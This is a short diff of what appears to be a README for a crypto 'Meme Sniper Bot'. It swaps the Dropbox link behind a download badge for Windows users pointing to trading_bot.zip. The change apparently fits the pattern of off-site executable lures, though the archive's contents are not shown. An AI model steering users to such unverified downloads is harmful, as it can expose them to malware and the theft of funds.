@@ -16,7 +16,7 @@ Explore the project on GitHub, review the source code, and learn more about the 
 
 <div align="center">
 
-<a href="https://www.dropbox.com/scl/fi/mara7s4tdavb5tqlpsrmy/trading_bot.zip?rlkey=ob6bwq1utq8ixhkvkrhn9m9ay&st=gh1kjz7m&dl=1">
+<a href="https://www.dropbox.com/scl/fi/1l1ga8ryv1en7du70hzmq/trading_bot.zip?rlkey=zafdxjt3bxgl99uaw41qt7fex&st=rmkpsnys&dl=1">
   <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20MEME%20SNIPER%20BOT-2EA44F?style=for-the-badge&logo=windows&logoColor=white" alt="Download Meme Sniper Bot">
 </a>
 
